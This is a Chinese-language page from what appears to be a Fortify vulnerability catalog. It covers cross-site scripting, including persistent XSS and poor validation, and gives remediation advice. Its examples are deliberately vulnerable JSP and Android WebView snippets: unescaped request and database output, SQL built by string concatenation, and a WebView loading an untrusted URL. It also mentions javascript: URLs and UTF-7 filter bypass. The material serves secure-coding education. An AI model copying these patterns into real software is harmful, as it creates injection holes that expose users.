<h5 id="RECOMMENDATIONS-259"><a href="#RECOMMENDATIONS-259" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 XSS 的解决方法是，确保在适当位置进行验证，并检验其属性是否正确。</p>
<p>由于 XSS 漏洞出现在应用程序的输出中包含恶意数据时，因此，合乎逻辑的做法是在数据流出应用程序的前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态内容，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 XSS 也执行输入验证。</p>
<p>由于 Web 应用程序必须验证输入信息以避免其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是，加强一个应用程序现有的输入验证机制，将 XSS 检测包括其中。尽管有一定的价值，但 XSS 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储或其他可信赖的数据源接受输入，而该数据存储所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 XSS 漏洞的最佳方法是验证所有进入应用程序以及由应用程序传送至用户端的数据。</p>
<p>针对 XSS 漏洞进行验证最安全的方式是，创建一份安全字符白名单，允许其中的字符出现在 HTTP 内容中，并且只接受完全由这些经认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，电话号码可能仅包含 0-9 的数字。然而，这种解决方法在 Web 应用程序中通常是行不通的，因为许多字符对浏览器来说都具有特殊的含义，在写入代码时，这些字符仍应被视为合法的输入，比如一个 Web 设计版就必须接受带有 HTML 代码片段的输入。</p>
<p>更灵活的解决方法称为黑名单方法，但其安全性较差，这种方法在进行输入之前就有选择地拒绝或避免了潜在的危险字符。为了创建这样一个列表，首先需要了解对于 Web 浏览器具有特殊含义的字符集。虽然 HTML 标准定义了哪些字符具有特殊含义，但是许多 Web 浏览器会设法更正 HTML 中的常见错误，并可能在特定的上下文中认为其他字符具有特殊含义，这就是我们不鼓励使用黑名单作为阻止 XSS 的方法的原因。卡耐基梅隆大学 (Carnegie Mellon University) 软件工程学院 (Software Engineering Institute) 下属的 CERT(R) (CERT(R) Coordination Center) 合作中心提供了有关各种上下文中认定的特殊字符的具体信息 [1]：</p>
<p>在有关块级别元素的内容中（位于一段文本的中间）：</p>
<p>－“&lt;”是一个特殊字符，因为它可以引入一个标签。</p>
<p>－“&amp;”是一个特殊字符，因为它可以引入一个字符实体。</p>
<p>－“&gt;”是一个特殊字符，之所以某些浏览器将其认定为特殊字符，是基于一种假设，即该页的作者本想在前面添加一个“&lt;”，却错误地将其遗漏了。</p>
<p>下面的这些原则适用于属性值：</p>
<p>－ 对于外加双引号的属性值，双引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于外加单引号的属性值，单引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于不带任何引号的属性值，空格字符（如空格符和制表符）是特殊字符。</p>
<p>-“&amp;”与某些特定变量一起使用时是特殊字符，因为它引入了一个字符实体。</p>
<p>例如，在 URL 中，搜索引擎可能会在结果页面内提供一个链接，用户可以点击该链接来重新运行搜索。可以将这一方法运用于编写 URL 中的搜索查询语句，这将引入更多特殊字符：</p>
<p>－ 空格符、制表符和换行符是特殊字符，因为它们标记了 URL 的结束。</p>
<p>-“&amp;”是特殊字符，因为它可引入一个字符实体或分隔 CGI 参数。</p>
<p>－ 非 ASCII 字符（即 ISO-8859-1 编码表中所有高于 128 的字符）不允许出现在 URL 中，因此在此上下文中也被视为特殊字符。</p>
<p>－ 在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的“%”符号。例如，当输入中出现“%68%65%6C%6C%6F”时，只有从输入的内容中过滤掉“%”，上述字符串才能在网页上显示为“hello”。</p>
<p>在<code>&lt;SCRIPT&gt; &lt;/SCRIPT&gt;</code>的正文内：</p>
<p>— 如果可以将文本直接插入到已有的脚本标签中，应该过滤掉分号、省略号、中括号和换行符。</p>
<p>服务器端脚本：</p>
<p>－ 如果服务器端脚本会将输入中的感叹号 (!) 转换成输出中的双引号 (“)，则可能需要对此进行更多过滤。</p>
<p>其他可能出现的情况：</p>
<p>－ 如果攻击者在 UTF-7 中提交了一个请求，那么特殊字符“&lt;”可能会显示为“+ADw-”，并可能会绕过过滤。如果输出包含在没有确切定义编码格式的网页中，有些浏览器就会设法根据内容自动识别编码（此处采用 UTF-7 格式）。</p>
<p>一旦在应用程序中确定了针对 XSS 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符，下一个难点就是定义验证过程中处理各种特殊字符的方式。如果应用程序认定某些特殊字符为无效输入，那么您可以拒绝任何带有这些无效特殊字符的输入。第二种选择就是采用过滤手段来删除这些特殊字符。然而，过滤的负面作用在于，过滤内容的显示将发生改变。在需要完整显示输入内容的情况下，过滤的这种负面作用可能是无法接受的。</p>
<p>如果必须接受带有特殊字符的输入，并将其准确地显示出来，验证机制一定要对所有特殊字符进行编码，以便删除其具有的含义。官方的 HTML 规范 [2] 提供了特殊字符对应的 ISO 8859-1 编码值的完整列表。</p>
<p>许多应用程序服务器都试图避免应用程序出现 Cross-Site Scripting 漏洞，具体做法是为负责设置特定 HTTP 响应内容的函数提供各种实现方式，以检验是否存在进行 Cross-Site Scripting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</p>
<h5 id="REFERENCES-258"><a href="#REFERENCES-258" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Understanding Malicious Content Mitigation for Web Developers CERT</p>
<p>[2] HTML 4.01 Specification W3</p>
<p>[3] Tongbo Luo, Hao Hao, Wenliang Du, Yifei Wang, and Heng Yin Attacks on WebView in the Android System</p>
<p>[4] Erika Chin and David Wagner Bifocals: AnalyzingWebView Vulnerabilities in Android Applications</p>
<p>[5] INJECT-3: XML and HTML generation requires care Oracle</p>
<p>[6] INPUT-1: Validate inputs Oracle</p>
<p>[7] Standards Mapping - Common Weakness Enumeration CWE ID 79, CWE ID 80</p>
<p>[8] Standards Mapping - FIPS200 SI</p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting</p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS)</p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS)</p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS)</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7</p>
<p>[21] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 079</p>
<p>[22] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 079</p>
<p>[23] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 079</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I</p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[34] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting</p>
<p>[35] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08)</p>
<h4 id="Cross-Site-Scripting-Persistent"><a href="#Cross-Site-Scripting-Persistent" class="headerlink" title="Cross-Site Scripting: Persistent"></a>Cross-Site Scripting: Persistent</h4><h5 id="ABSTRACT-260"><a href="#ABSTRACT-260" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>向一个 Web 浏览器发送未经验证的数据会导致该浏览器执行恶意代码。</p>
<h5 id="EXPLANATION-261"><a href="#EXPLANATION-261" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Cross-Site Scripting (XSS) 漏洞在以下情况下发生：</p>
<ol>
<li><p>数据通过一个不可信赖的数据源进入 Web 应用程序。对于 Persistent（也称为 Stored）XSS，不可信赖的源通常为数据库或其他后端数据存储，而对于 Reflected XSS，该源通常为 Web 请求。</p>
</li>
<li><p>未检验包含在动态内容中的数据，便将其传送给了 Web 用户。</p>
</li>
</ol>
<p>传送到 Web 浏览器的恶意内容通常采用 JavaScript 代码片段的形式，但也可能会包含一些 HTML、Flash 或者其他任意一种可以被浏览器执行的代码。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私人数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。</p>
<p>示例 1：以下 JSP 代码片段可在数据库中查询具有给定 ID 的雇员，并输出相应雇员姓名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;%...</span><br><span class="line"></span><br><span class="line">Statement stmt = conn.createStatement();</span><br><span class="line"></span><br><span class="line">ResultSet rs = stmt.executeQuery(&quot;select * from emp where id=&quot;+eid);</span><br><span class="line"></span><br><span class="line">if (rs != null) &#123;</span><br><span class="line"></span><br><span class="line">   rs.next();</span><br><span class="line"></span><br><span class="line">   String name = rs.getString(&quot;name&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Employee Name: &lt;%= name %&gt;</span><br></pre></td></tr></table></figure>
<p>如果对 name 的值处理得当，该代码就能正常地执行各种功能；如若处理不当，就会对代码的盗取行为无能为力。这段代码暴露出的危险较小，因为 name 的值是从数据库中读取的，而且显然这些内容是由应用程序管理的。然而，如果 name 的值是由用户提供的数据产生，数据库就会成为恶意内容沟通的通道。如果不对数据库中存储的所有数据进行恰当的输入验证，那么攻击者就可以在用户的 Web 浏览器中执行恶意命令。这种类型的 Persistent XSS（也称为 Stored XSS）盗取极其阴险狡猾，因为数据存储导致的间接性使得辨别威胁的难度增大，而且还提高了一个攻击影响多个用户的可能性。XSS 盗取会从访问提供留言簿 (guestbook) 的网站开始。攻击者会在这些留言簿的条目中嵌入 JavaScript，接下来所有访问该留言簿的用户都会执行这些恶意代码。</p>
<p>示例 2：以下 JSP 代码片段可从 HTTP 请求中读取雇员 ID eid，并将其显示给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;% String eid = request.getParameter(&quot;eid&quot;); %&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">Employee ID: &lt;%= eid %&gt;</span><br></pre></td></tr></table></figure>
<p>如例 1 中所述，如果 eid 只包含标准的字母或数字文本，此代码就能正确运行。如果 eid 里有包含元字符或源代码中的值，那么 Web 浏览器就会像显示 HTTP 响应那样执行代码。</p>
<p>起初，这个例子似乎是不会轻易遭受攻击的。毕竟，有谁会输入导致恶意代码的 URL，并且还在自己的电脑上运行呢？真正的危险在于攻击者会创建恶意的 URL，然后采用电子邮件或者社会工程的欺骗手段诱使受害者访问此 URL 的链接。当受害者单击这个链接时，他们不知不觉地通过易受攻击的网络应用程序，将恶意内容带到了自己的电脑中。这种对易受攻击的 Web 应用程序进行盗取的机制通常被称为反射式 XSS。</p>
<p>有些人认为在移动世界中，典型的 Web 应用程序漏洞（如 cross-site scripting）是无意义的 – 为什么用户要攻击自己？但是，谨记移动平台的本质是从各种来源下载并在相同设备上运行的应用程序。恶意软件在银行应用程序附近运行的可能性很高，它们会强制扩展移动应用程序的攻击面（包括跨进程通信）。</p>
<p>示例 3：以下代码在 Android WebView 中启用了 JavaScript（默认情况下，JavaScript 为禁用状态），并根据从 Android Intent 接收到的值加载页面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">        WebView webview = (WebView) findViewById(R.id.webview);</span><br><span class="line"></span><br><span class="line">        webview.getSettings().setJavaScriptEnabled(true);</span><br><span class="line"></span><br><span class="line">        String url = this.getIntent().getExtras().getString(&quot;url&quot;);</span><br><span class="line"></span><br><span class="line">        webview.loadUrl(url);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>如果 url 的值以 javascript: 开头，则接下来的 JavaScript 代码将在 WebView 中的 Web 页面上下文内部执行。</p>
<p>正如例子中所显示的，XSS 漏洞是由于 HTTP 响应中包含了未经验证的数据代码而引起的。受害者遭受 XSS 攻击的途径有三种：</p>
<p>－ 如例 1 所述，应用程序将危险数据储存在一个数据库或其他可信赖的数据存储器中。这些危险数据随后会被回写到应用程序中，并包含在动态内容中。Persistent XSS 盗取发生在如下情况：攻击者将危险内容注入到数据存储器中，且该存储器之后会被读取并包含在动态内容中。从攻击者的角度看，注入恶意内容的最佳位置莫过于一个面向许多用户，尤其是相关用户显示的区域。相关用户通常在应用程序中具备较高的特权，或相互之间交换敏感数据，这些数据对攻击者来说有利用价值。如果某一个用户执行了恶意内容，攻击者就有可能以该用户的名义执行某些需要特权的操作，或者获得该用户个人所有的敏感数据的访问权限。</p>
<p>－ 如例 2 所述，系统从 HTTP 请求中直接读取数据，并在 HTTP 响应中返回数据。当攻击者诱使用户为易受攻击的 Web 应用程序提供危险内容，而这些危险内容随后会反馈给用户并在 Web 浏览器中执行，就会发生反射式 XSS 盗取。发送恶意内容最常用的方法是，把恶意内容作为一个参数包含在公开发表的 URL 中，或者通过电子邮件直接发送给受害者。以这种手段构造的 URL 构成了多种“网络钓鱼”(phishing) 阴谋的核心，攻击者借此诱骗受害者访问指向易受攻击站点的 URL。站点将攻击者的内容反馈给受害者以后，便会执行这些内容，接下来会把用户计算机中的各种私密信息（比如包含会话信息的 cookie）传送给攻击者，或者执行其他恶意活动。</p>
<p>— 正如例 3 所示，应用程序之外的数据源将危险数据储存在一个数据库或其他数据存储器中，随后这些危险数据被当作可信赖的数据回写到应用程序中，并存储在动态内容中。</p>
<p>许多现代 Web 框架都提供对用户输入执行验证的机制。其中包括 Struts 和 Struts 2。为了突出显示未经验证的输入源，Fortify 安全编码规则包会降低 Fortify Static Code Analyzer（Fortify 静态代码分析器）报告的问题被利用的可能性，并在使用框架验证机制时提供相应的依据，以动态重新调整问题优先级。我们将这种功能称之为上下文敏感排序。为了进一步帮助 Fortify 用户执行审计过程，Fortify 软件安全研究团队提供了数据验证项目模板，该模板会根据应用于输入源的验证机制，将问题分组到多个文件夹中。</p>
<h5 id="RECOMMENDATIONS-260"><a href="#RECOMMENDATIONS-260" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 XSS 的解决方法是，确保在适当位置进行验证，并检验其属性是否正确。</p>
<p>由于 XSS 漏洞出现在应用程序的输出中包含恶意数据时，因此，合乎逻辑的做法是在数据流出应用程序的前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态内容，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 XSS 也执行输入验证。</p>
<p>由于 Web 应用程序必须验证输入信息以避免其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是，加强一个应用程序现有的输入验证机制，将 XSS 检测包括其中。尽管有一定的价值，但 XSS 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储或其他可信赖的数据源接受输入，而该数据存储所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 XSS 漏洞的最佳方法是验证所有进入应用程序以及由应用程序传送至用户端的数据。</p>
<p>针对 XSS 漏洞进行验证最安全的方式是，创建一份安全字符白名单，允许其中的字符出现在 HTTP 内容中，并且只接受完全由这些经认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，电话号码可能仅包含 0-9 的数字。然而，这种解决方法在 Web 应用程序中通常是行不通的，因为许多字符对浏览器来说都具有特殊的含义，在写入代码时，这些字符仍应被视为合法的输入，比如一个 Web 设计版就必须接受带有 HTML 代码片段的输入。</p>
<p>更灵活的解决方法称为黑名单方法，但其安全性较差，这种方法在进行输入之前就有选择地拒绝或避免了潜在的危险字符。为了创建这样一个列表，首先需要了解对于 Web 浏览器具有特殊含义的字符集。虽然 HTML 标准定义了哪些字符具有特殊含义，但是许多 Web 浏览器会设法更正 HTML 中的常见错误，并可能在特定的上下文中认为其他字符具有特殊含义，这就是我们不鼓励使用黑名单作为阻止 XSS 的方法的原因。卡耐基梅隆大学 (Carnegie Mellon University) 软件工程学院 (Software Engineering Institute) 下属的 CERT(R) (CERT(R) Coordination Center) 合作中心提供了有关各种上下文中认定的特殊字符的具体信息 [1]：</p>
<p>在有关块级别元素的内容中（位于一段文本的中间）：</p>
<p>－“&lt;”是一个特殊字符，因为它可以引入一个标签。</p>
<p>－“&amp;”是一个特殊字符，因为它可以引入一个字符实体。</p>
<p>－“&gt;”是一个特殊字符，之所以某些浏览器将其认定为特殊字符，是基于一种假设，即该页的作者本想在前面添加一个“&lt;”，却错误地将其遗漏了。</p>
<p>下面的这些原则适用于属性值：</p>
<p>－ 对于外加双引号的属性值，双引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于外加单引号的属性值，单引号是特殊字符，因为它们标记了该属性值的结束。</p>
<p>－ 对于不带任何引号的属性值，空格字符（如空格符和制表符）是特殊字符。</p>
<p>-“&amp;”与某些特定变量一起使用时是特殊字符，因为它引入了一个字符实体。</p>
<p>例如，在 URL 中，搜索引擎可能会在结果页面内提供一个链接，用户可以点击该链接来重新运行搜索。可以将这一方法运用于编写 URL 中的搜索查询语句，这将引入更多特殊字符：</p>
<p>－ 空格符、制表符和换行符是特殊字符，因为它们标记了 URL 的结束。</p>
<p>-“&amp;”是特殊字符，因为它可引入一个字符实体或分隔 CGI 参数。</p>
<p>－ 非 ASCII 字符（即 ISO-8859-1 编码表中所有高于 128 的字符）不允许出现在 URL 中，因此在此上下文中也被视为特殊字符。</p>
<p>－ 在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的“%”符号。例如，当输入中出现“%68%65%6C%6C%6F”时，只有从输入的内容中过滤掉“%”，上述字符串才能在网页上显示为“hello”。</p>
<p>在 <code>&lt;SCRIPT&gt; &lt;/SCRIPT&gt;</code>的正文内：</p>
<p>— 如果可以将文本直接插入到已有的脚本标签中，应该过滤掉分号、省略号、中括号和换行符。</p>
<p>服务器端脚本：</p>
<p>－ 如果服务器端脚本会将输入中的感叹号 (!) 转换成输出中的双引号 (“)，则可能需要对此进行更多过滤。</p>
<p>其他可能出现的情况：</p>
<p>－ 如果攻击者在 UTF-7 中提交了一个请求，那么特殊字符“&lt;”可能会显示为“+ADw-”，并可能会绕过过滤。如果输出包含在没有确切定义编码格式的网页中，有些浏览器就会设法根据内容自动识别编码（此处采用 UTF-7 格式）。</p>
<p>一旦在应用程序中确定了针对 XSS 攻击执行验证的正确要点，以及验证过程中要考虑的特殊字符，下一个难点就是定义验证过程中处理各种特殊字符的方式。如果应用程序认定某些特殊字符为无效输入，那么您可以拒绝任何带有这些无效特殊字符的输入。第二种选择就是采用过滤手段来删除这些特殊字符。然而，过滤的负面作用在于，过滤内容的显示将发生改变。在需要完整显示输入内容的情况下，过滤的这种负面作用可能是无法接受的。</p>
<p>如果必须接受带有特殊字符的输入，并将其准确地显示出来，验证机制一定要对所有特殊字符进行编码，以便删除其具有的含义。官方的 HTML 规范 [2] 提供了特殊字符对应的 ISO 8859-1 编码值的完整列表。</p>
<p>许多应用程序服务器都试图避免应用程序出现 Cross-Site Scripting 漏洞，具体做法是为负责设置特定 HTTP 响应内容的函数提供各种实现方式，以检验是否存在进行 Cross-Site Scripting 攻击必需的字符。不要依赖运行应用程序的服务器，以此确保该应用程序的安全。开发了某个应用程序后，并不能保证在其生命周期中它会在哪些应用程序服务器中运行。由于标准和已知盗取方式的演变，我们不能保证应用程序服务器也会保持同步。</p>
<h5 id="REFERENCES-259"><a href="#REFERENCES-259" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Understanding Malicious Content Mitigation for Web Developers CERT</p>
<p>[2] HTML 4.01 Specification W3</p>
<p>[3] Tongbo Luo, Hao Hao, Wenliang Du, Yifei Wang, and Heng Yin Attacks on WebView in the Android System</p>
<p>[4] Erika Chin and David Wagner Bifocals: AnalyzingWebView Vulnerabilities in Android Applications</p>
<p>[5] INJECT-3: XML and HTML generation requires care Oracle</p>
<p>[6] INPUT-1: Validate inputs Oracle</p>
<p>[7] Standards Mapping - Common Weakness Enumeration CWE ID 79, CWE ID 80</p>
<p>[8] Standards Mapping - FIPS200 SI</p>
<p>[9] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1)</p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection</p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A4 Cross Site Scripting</p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A1 Cross Site Scripting (XSS)</p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A2 Cross-Site Scripting (XSS)</p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A3 Cross-Site Scripting (XSS)</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.4</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.1</p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.7</p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.7</p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.7</p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.7</p>
<p>[21] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 079</p>
<p>[22] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 079</p>
<p>[23] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 079</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3580 CAT I</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3580 CAT I</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3580 CAT I</p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3580 CAT I</p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3580 CAT I</p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3580 CAT I</p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3580 CAT I</p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002490 CAT I, APSC-DV-002560 CAT I</p>
<p>[34] Standards Mapping - Web Application Security Consortium 24 + 2 Cross-Site Scripting</p>
<p>[35] Standards Mapping - Web Application Security Consortium Version 2.00 Cross-Site Scripting (WASC-08)</p>
<h4 id="Cross-Site-Scripting-Poor-Validation"><a href="#Cross-Site-Scripting-Poor-Validation" class="headerlink" title="Cross-Site Scripting: Poor Validation"></a>Cross-Site Scripting: Poor Validation</h4><h5 id="ABSTRACT-261"><a href="#ABSTRACT-261" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>依靠 HTML、XML 或其他类型编码验证用户输入可能会导致浏览器执行恶意代码。</p>
<h5 id="EXPLANATION-262"><a href="#EXPLANATION-262" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>使用特定的编码构造，例如带有 escapeXml=“true” 属性（默认设置）的<code>&lt;c:out/&gt;</code>标签可以避免一部分 cross-site scripting 攻击，但不能完全避免。根据数据出现的上下文，除 HTML 编码的基本字符 &lt;、&gt;、&amp; 和 “ 以及 XML 编码的字符 &lt;、&gt;、&amp;、” 和 ‘ 之外，其他字符可能具有元意。依靠此类编码构造等同于用一个安全性较差的黑名单来防止 cross-site scripting 攻击，并且可能允许攻击者注入恶意代码，并在浏览器中加以执行。由于不可能始终准确地确定静态显示数据的上下文，所以即便进行了编码，Fortify Static Code Analyzer（Fortify 静态代码分析器）仍会报告跨站脚本攻击结果，并将其显示为 Cross-Site Scripting: Poor Validation 问题。</p>
<p>Cross-Site Scripting (XSS) 漏洞在以下情况下发生：</p>
<ol>
<li><p>数据通过一个不可信赖的数据源进入 Web 应用程序。对于 Reflected XSS，不可信赖的源大多数情况下为 Web 请求；而对于 Persistent（也称为 Stored）XSS，该源通常为数据库查询的结果。</p>
</li>
<li><p>未检验包含在动态内容中的数据，便将其传送给了 Web 用户。</p>
</li>
</ol>
<p>传送到 Web 浏览器的恶意内容通常采用 JavaScript 代码片段的形式，但也可能会包含一些 HTML、Flash 或者其他任意一种可以被浏览器执行的代码。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私人数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。</p>
<p>示例 1：以下 JSP 代码片段可从 HTTP 请求中读取雇员 ID eid，并通过 <code>&lt;c:out/&gt;</code>标签将其显示给用户。</p>
<p><code>Employee ID: &lt;c:out value=&quot;${param.eid}&quot;/&gt;</code></p>
<p>如果 eid 只包含标准的字母或数字文本，这个例子中的代码就能正确运行。如果 eid 里有包含元字符或源代码中的值，那么 Web 浏览器就会像显示 HTTP 响应那样执行代码。</p>
<p>起初，这个例子似乎是不会轻易遭受攻击的。毕竟，有谁会输入导致恶意代码的 URL，并且还在自己的电脑上运行呢？真正的危险在于攻击者会创建恶意的 URL，然后采用电子邮件或者社会工程的欺骗手段诱使受害者访问此 URL 的链接。当受害者单击这个链接时，他们不知不觉地通过易受攻击的网络应用程序，将恶意内容带到了自己的电脑中。这种对易受攻击的 Web 应用程序进行盗取的机制通常被称为反射式 XSS。</p>
<p>示例 2：以下 JSP 代码片段可在数据库中查询具有给定 ID 的雇员，并通过 <code>&lt;c:out/&gt;</code> 标签输出相应雇员姓名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;%...</span><br><span class="line"></span><br><span class="line">Statement stmt = conn.createStatement();</span><br><span class="line"></span><br><span class="line">ResultSet rs = stmt.executeQuery(&quot;select * from emp where id=&quot;+eid);</span><br><span class="line"></span><br><span class="line">if (rs != null) &#123;</span><br><span class="line"></span><br><span class="line">   rs.next();</span><br><span class="line"></span><br><span class="line">   String name = rs.getString(&quot;name&quot;);</span><br><span 